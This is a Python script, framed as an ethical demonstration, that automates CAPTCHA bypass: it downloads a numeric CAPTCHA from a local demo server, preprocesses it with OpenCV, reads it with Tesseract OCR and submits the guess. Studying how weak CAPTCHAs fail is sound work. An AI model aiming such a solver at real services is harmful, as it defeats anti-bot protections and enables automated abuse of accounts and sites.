# ai_hack.py - الأداة الأصلية التي تعمل

import cv2
import numpy as np
import requests
import pytesseract
import re
import time

# عيّن مسار Tesseract (عدّل حسب مكان التثبيت)
pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

class AICaptchaSolver:
    def __init__(self):
        # استخدم localhost عوضاً عن IP ثابت
        self.server_url = "http://localhost:5000"
        
    def download_captcha(self):
        print("  ├─ Downloading CAPTCHA from target server...")
        try:
            response = requests.get(f"{self.server_url}/captcha", timeout=5)
            if response.status_code == 200:
                with open("captcha_downloaded.png", "wb") as f:
                    f.write(response.content)
                return "captcha_downloaded.png"
        except Exception as e:
            print(f"  ├─ ❌ Download error: {e}")
        return None
    
    def preprocess_image(self, image_path):
        print("  ├─ Applying AI Computer Vision preprocessing...")
        img = cv2.imread(image_path)
        if img is None:
            return None
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        _, thresh = cv2.threshold(gray, 120, 255, cv2.THRESH_BINARY_INV)
        denoised = cv2.medianBlur(thresh, 3)
        kernel = np.ones((2, 2), np.uint8)
        dilated = cv2.dilate(denoised, kernel, iterations=1)
        return dilated
    
    def solve_captcha_with_ai(self, processed_image):
        print("  ├─ Solving CAPTCHA using AI OCR Engine...")
        config = r'--oem 3 --psm 8 -c tessedit_char_whitelist=0123456789'
        text = pytesseract.image_to_string(processed_image, config=config)
        numbers_only = re.sub(r'[^0-9]', '', text)
        return numbers_only
    
    def verify_code(self, code):
        print(f"  ├─ 🤖 AI Predicted: {code}")
        print("  ├─ Sending code to target server...")
        try:
            response = requests.post(f"{self.server_url}/verify", json={"code": code}, timeout=5)
            return response.json()
        except Exception as e:
            print(f"  ├─ ❌ Verification error: {e}")
            return {'success': False}
    
    def run_attack(self, max_attempts=3):
        print("🤖 Starting AI-Powered Mobile Hacking Attack...")
        print("=" * 50)
        
        for attempt in range(1, max_attempts + 1):
            print(f"\n📡 Attempt {attempt}/{max_attempts}")
            
            img_path = self.download_captcha()
            if not img_path:
                print("  └─ ❌ Failed to download CAPTCHA")
                continue
            
            processed = self.preprocess_image(img_path)
            if processed is None:
                print("  └─ ❌ Failed to process image")
                continue
                
            cv2.imwrite(f"processed_attempt_{attempt}.png", processed)
            
            solved_code = self.solve_captcha_with_ai(processed)
            
            if not solved_code or len(solved_code) != 4:
                print("  ├─ ⚠️ AI confidence low, trying enhanced processing...")
                raw_img = cv2.imread(img_path)
                if raw_img is not None:
                    solved_code = pytesseract.image_to_string(raw_img, config='--psm 8')
                    solved_code = re.sub(r'[^0-9]', '', solved_code)
            
            if not solved_code:
                print("  └─ ❌ Could not extract code")
                continue
                
            result = self.verify_code(solved_code)
            
            if result.get('success'):
                print(f"  └─ 🎉 {result['message']}")
                print("=" * 50)
                print("✅ HACK SUCCESSFUL! AI bypassed the mobile app security.")
                return True
            else:
                print(f"  └─ ❌ {result.get('message', 'Verification failed')}")
        
        print("\n❌ Attack failed after all attempts.")
        return False

if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════╗
    ║   Mobile Hacking with AI - Ethical Demo      ║
    ║   Bypassing CAPTCHA using Computer Vision    ║
    ╚══════════════════════════════════════════════╝
    """)
    
    hacker = AICaptchaSolver()
    hacker.run_attack()